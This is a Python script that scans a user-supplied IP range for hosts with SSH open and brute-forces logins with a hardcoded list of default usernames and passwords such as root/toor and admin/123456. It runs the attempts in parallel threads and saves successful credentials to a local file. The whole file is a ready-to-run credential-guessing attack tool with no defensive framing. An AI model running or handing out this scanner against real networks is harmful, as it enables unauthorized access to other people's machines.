import paramiko
import socket
import threading
import time
import sys
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style

def check_port(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, 22))
    sock.close()
    return result == 0

def ssh_connect(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=22, username=username, password=password, timeout=5, banner_timeout=10)
        transport = ssh.get_transport()
        remote_version = transport.remote_version
        if "2.0" in remote_version:
            print(f"{Fore.GREEN}[+] {ip:<15} Success: {username}/{password:<10} SSHv2{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] {ip:<15} Success: {username}/{password:<10} SSHv1{Style.RESET_ALL}")
        with open("valid_logins.txt", "a") as f:
            f.write(f"{ip}:{username}:{password}\n")
    except paramiko.AuthenticationException:
        print(f"{Fore.RED}[-] {ip:<15} Authentication failed: {username}/{password:<10}{Style.RESET_ALL}")
    except socket.error:
        print(f"{Fore.YELLOW}[!] {ip:<15} Connection failed{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] {ip:<15} Error: {str(e)}{Style.RESET_ALL}")
    ssh.close()

def scan_ip(ip):
    print(f"{Fore.CYAN}Scanning {ip}...{Style.RESET_ALL}")
    if check_port(ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 22))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            if "SSH" in banner:
                usernames = ["kali", "root", "ubuntu", "admin"]
                passwords = ["kali", "toor", "123456", "qwerty", "debian", "password"]
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = []
                    for username in usernames:
                        for password in passwords[:3]:
                            futures.append(executor.submit(ssh_connect, ip, username, password))
                        for password in passwords[3:]:
                            futures.append(executor.submit(ssh_connect, ip, username, password))
                    for future in as_completed(futures):
                        pass
            else:
                print(f"{Fore.YELLOW}[!] {ip:<15} Port 22 is open but does not appear to be an SSH server{Style.RESET_ALL}")
        except socket.timeout:
            print(f"{Fore.YELLOW}[!] {ip:<15} Connection timed out{Style.RESET_ALL}")
        except socket.error as e:
            print(f"{Fore.YELLOW}[!] {ip:<15} Error: {str(e)}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[!] {ip:<15} Port 22 is closed{Style.RESET_ALL}")

def main():
    ip_range = input("Enter IP range (e.g. 192.168.0.1/24): ")

    try:
        network = ipaddress.ip_network(ip_range)
    except ValueError:
        print("Invalid IP range")
        sys.exit()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for ip in network.hosts():
            futures.append(executor.submit(scan_ip, str(ip)))
        for future in as_completed(futures):
            pass

if __name__ == "__main__":
    main()
